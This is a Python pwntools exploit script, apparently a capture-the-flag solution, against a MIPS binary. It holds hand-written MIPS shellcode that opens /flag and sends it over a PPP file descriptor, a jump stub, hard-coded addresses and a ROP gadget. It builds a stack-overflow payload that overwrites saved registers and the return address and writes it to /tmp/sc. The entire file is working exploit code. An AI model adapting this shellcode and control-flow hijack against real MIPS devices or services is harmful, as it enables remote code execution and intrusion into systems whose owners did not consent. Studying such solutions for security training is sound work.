#!/usr/bin/env python3
from pwn import *

context(arch="mips", log_level="debug")

# getflag shellcode: write flag to ppp_fd
flag_sc = \
"""
    /* Save dst fd for later */
    /* mov $s0, $s0 is a noop */

    /* push '/flag\x00' */
    li $t1, 0x616c662f
    sw $t1, -8($sp)
    li $t9, ~0x67
    not $t1, $t9
    sw $t1, -4($sp)
    addiu $sp, $sp, -8

    /* call open('$sp', 'O_RDONLY') */
    add $a0, $sp, $0 /* mov $a0, $sp */
    slti $a1, $zero, 0xFFFF /* $a1 = 0 */
    ori $v0, $zero, SYS_open
    syscall 0x40404

    /* Save src fd for later */
    sw $v0, -4($sp) /* mov $s1, $v0 */
    lw $s1, -4($sp)

    /* Load file size */
    li $a3, 0xff

    /* call sendfile('$s0', '$s1', 0, '$a3') */
    li $t1, 0x45B1F0 /* ppp_fd */
    lw $a0, ($t1)
    add $a1, $s1, $0 /* mov $a1, $s1 */
    slti $a2, $zero, 0xFFFF /* $a2 = 0 */
    ori $v0, $zero, SYS_sendfile
    syscall 0x40404
"""

# jump shellcode: jump to getflag shellcode
jmp_sc = \
"""
lw  $t0, ($s0)   /* Load jump shellcode address from __sp pointer */
li  $t1, 0x268
sub $t9, $t0, $t1
j   $t9   /* jump to getflag shellcode */
"""

# `__sp` pointer in `sigjmp` struct that stores the address of jump shellcode
ptr = 0x0045c71c

# 0x0043e310 : lw $t9, ($s0) ; addiu $s1, $s1, 1 ; move $a2, $s5 ; move $a1, $s4 ; jalr $t9
gadget = 0x0043E310

payload  = asm(flag_sc).ljust(616, b'\x00')
payload += asm(jmp_sc).ljust(648-616, b'\x00')
payload += p32(ptr) * 5  # s0 ~ s4
payload += p32(gadget)   # ra

payload = payload.ljust(1024, b'\x00')

with open("/tmp/sc", "wb") as fp:
    fp.write(payload)

print(payload)
